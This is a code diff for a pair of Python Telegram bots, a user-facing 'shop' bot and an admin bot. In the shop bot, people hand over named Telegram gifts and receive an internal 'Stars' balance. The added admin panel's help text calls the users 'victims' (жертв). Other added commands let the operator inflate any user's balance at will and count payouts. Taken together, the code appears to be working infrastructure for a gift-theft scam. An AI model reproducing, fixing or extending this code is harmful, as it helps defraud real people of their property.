@@ -142,9 +142,8 @@ def kb_menu(uid):
         [InlineKeyboardButton(text="💸 Вывести", callback_data="m:withdraw")],
     ])
 
-# ================= BOTS =================
+# ================= SHOP BOT =================
 shop = Router()
-adm = Router()
 
 @shop.message(Command("start"))
 async def shop_start(m: Message, command: CommandObject):
@@ -163,6 +162,7 @@ async def shop_start(m: Message, command: CommandObject):
             o = get_offer(oid)
             try: await m.bot.send_message(o["admin_id"], f"🔔 Оффер #{oid} открыт: @{m.from_user.username or '—'}")
             except Exception: pass
+        
         set_status(oid, "accepted")
         await m.answer(
             f"✅ Оффер принят.\n\nПередайте подарок <b>{o['gift_name']}</b> на "
@@ -186,14 +186,23 @@ async def receive_proof(m: Message, state: FSMContext):
     if not oid: return
     o = get_offer(oid)
     if not o or o["user_id"] != m.from_user.id: return await m.answer("Ошибка.")
+    
     proof = m.text or (m.photo[-1].file_id if m.photo else "none")
     set_status(oid, "paid", proof=proof)
     newbal = add_balance(o["user_id"], o["price_stars"])
-    await m.answer(f"✅ Подтверждение принято.\n<b>{o['price_stars']} ⭐ Stars</b> зачислены на баланс.\nБаланс: <b>{newbal} ⭐</b>", reply_markup=kb_menu(m.from_user.id))
+    
+    await m.answer(
+        f"✅ Подтверждение принято.\n<b>{o['price_stars']} ⭐ Stars</b> зачислены на баланс.\n"
+        f"Баланс: <b>{newbal} ⭐</b>", reply_markup=kb_menu(m.from_user.id))
+    
+    # Отправляем скриншот админу
     try:
-        await m.bot.send_message(o["admin_id"], f"📥 Оффер #{oid}: proof от {m.from_user.id}")
-        if m.photo: await m.bot.send_photo(o["admin_id"], m.photo[-1].file_id, caption=f"proof #{oid}")
-    except Exception: pass
+        await m.bot.send_message(o["admin_id"], f"📥 <b>Оффер #{oid}</b>: proof от <a href='tg://user?id={m.from_user.id}'>{m.from_user.full_name}</a> (@{m.from_user.username or '—'})")
+        if m.photo:
+            await m.bot.send_photo(o["admin_id"], m.photo[-1].file_id, caption=f"Скриншот к офферу #{oid}")
+        elif m.document:
+            await m.bot.send_document(o["admin_id"], m.document.file_id, caption=f"Файл к офферу #{oid}")
+    except Exception as e: log.error(f"Не удалось переслать скрин: {e}")
 
 @shop.callback_query(F.data == "m:balance")
 async def shop_balance(cb: CallbackQuery):
@@ -239,6 +248,20 @@ async def shop_support(m: Message):
 async def shop_autoreg(m: Message):
     upsert_user(m.from_user.id, m.from_user.username, m.from_user.full_name)
 
+
+# ================= ADMIN BOT =================
+adm = Router()
+
+@adm.message(Command("start"))
+async def adm_start(m: Message):
+    if not is_admin(m.from_user.id): return
+    await m.answer(
+        "🛠 <b>Админ-панель</b>\n\n"
+        "/offer — создать новый оффер\n"
+        "/users — список жертв\n"
+        "/addbal &lt;id&gt; &lt;сумма&gt; — начислить баланс\n"
+        "/stats — статистика"
+    )
 
 @adm.message(Command("offer"))
 async def adm_offer(m: Message, state: FSMContext):
@@ -297,6 +320,46 @@ async def adm_no(m: Message, state: FSMContext):
     if not is_admin(m.from_user.id): return
     await state.clear(); await m.answer("Отменено.")
 
+@adm.message(Command("users"))
+async def adm_users(m: Message):
+    if not is_admin(m.from_user.id): return
+    with db() as c:
+        users = c.execute("SELECT * FROM users ORDER BY created_at DESC LIMIT 30").fetchall()
+    if not users:
+        return await m.answer("Пока никого нет.")
+    
+    text = "👥 <b>Последние 30 юзеров:</b>\n\n"
+    for u in users:
+        bal = get_balance(u["user_id"])
+        text += f"ID: <code>{u['user_id']}</code> | @{u['username'] or '—'} | Баланс: {bal} ⭐\n"
+    await m.answer(text)
+
+@adm.message(Command("addbal"))
+async def adm_addbal(m: Message):
+    if not is_admin(m.from_user.id): return
+    args = m.text.split()
+    if len(args) != 3 or not args[1].isdigit() or not args[2].lstrip('-').isdigit():
+        return await m.answer("Использование: <code>/addbal ID СУММА</code>\nНапример: <code>/addbal 123456789 500</code>")
+    
+    uid = int(args[1])
+    amt = int(args[2])
+    newbal = add_balance(uid, amt)
+    
+    try:
+        await m.bot.send_message(uid, f"🎁 Вам начислен бонус: <b>{amt} ⭐</b>\nВаш баланс: <b>{newbal} ⭐</b>")
+        await m.answer(f"✅ Пользователю {uid} начислено {amt} ⭐. Новый баланс: {newbal} ⭐.")
+    except Exception:
+        await m.answer(f"✅ Баланс {uid} обновлен (+{amt} ⭐), но сообщение не доставлено.")
+
+@adm.message(Command("stats"))
+async def adm_stats(m: Message):
+    if not is_admin(m.from_user.id): return
+    with db() as c:
+        u = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
+        o = c.execute("SELECT COUNT(*) FROM offers").fetchone()[0]
+        p = c.execute("SELECT COUNT(*), COALESCE(SUM(amount),0) FROM payouts").fetchone()
+    await m.answer(f"📊 <b>Статистика</b>\nЮзеров: {u}\nОфферов: {o}\nВыплат: {p[0]} (сумма: {p[1]}⭐)")
+
 # ================= WEB SERVER & PINGER =================
 async def handle_ping(request):
     return web.Response(text="OK")
@@ -322,7 +385,6 @@ async def main():
     adm_dp = Dispatcher(storage=MemoryStorage())
     adm_dp.include_router(adm)
 
-    # Веб-сервер для Render
     app = web.Application()
     app.router.add_get('/', handle_ping)
     runner = web.AppRunner(app)
@@ -330,7 +392,6 @@ async def main():
     site = web.TCPSite(runner, '0.0.0.0', int(os.getenv("PORT", 8080)))
     await site.start()
     
-    # Пинг самого себя, чтобы не засыпал
     render_url = os.getenv("RENDER_EXTERNAL_URL")
     if render_url:
         asyncio.create_task(self_ping(render_url))
